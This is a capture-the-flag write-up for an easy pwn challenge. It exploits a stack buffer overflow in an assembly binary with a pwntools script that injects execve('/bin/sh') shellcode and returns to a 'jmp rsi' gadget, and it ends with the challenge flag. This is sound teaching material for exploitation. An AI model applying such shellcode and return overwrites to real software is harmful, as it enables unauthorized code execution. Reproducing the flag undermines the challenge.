---
title: "Assembler's Avenge"
ctf: "Unknown"
date: 2026-06-06
category: pwn
difficulty: easy
flag_format: "flag{...}"
---

# Assembler's Avenge

## Summary

Stack buffer overflow in a hand-written assembly ELF. No RELRO, no canary, NX disabled, no PIE. Overflow return address with `jmp rsi` gadget to execute custom shellcode on stack.

## Solution

### Step 1: Vulnerability

`_read` at `0x40106d` reads 24 bytes into `rbp-8` (8 byte buffer). Allows 16 byte overflow past saved RBP into return address.

### Step 2: Exploit

After the `read` syscall, `rsi` still points to the buffer. The `_exit` function ends with `jmp rsi` at `0x40106b`. String `/bin/sh` exists at `0x402065`.

13 byte execve shellcode fits in the 16-byte window (buffer + saved RBP), then return to `jmp rsi`:

```python
from pwn import *

context.arch = 'amd64'

JMP_RSI = 0x40106b
BIN_SH  = 0x402065

shellcode = asm(f'''
    xor esi, esi
    xor edx, edx
    mov al, 0x3b
    mov edi, {BIN_SH}
    syscall
''')

payload = shellcode.ljust(16, b'\x90') + p64(JMP_RSI)

p = process('./challenge/assemblers_avenge')
p.recvuntil(b'savior is:')
p.send(payload)
p.interactive()
```

## Flag

```
HTB{y0ur_l0c4l_4553mbl3R5_4v3ng3d_0n_t1m3}
```
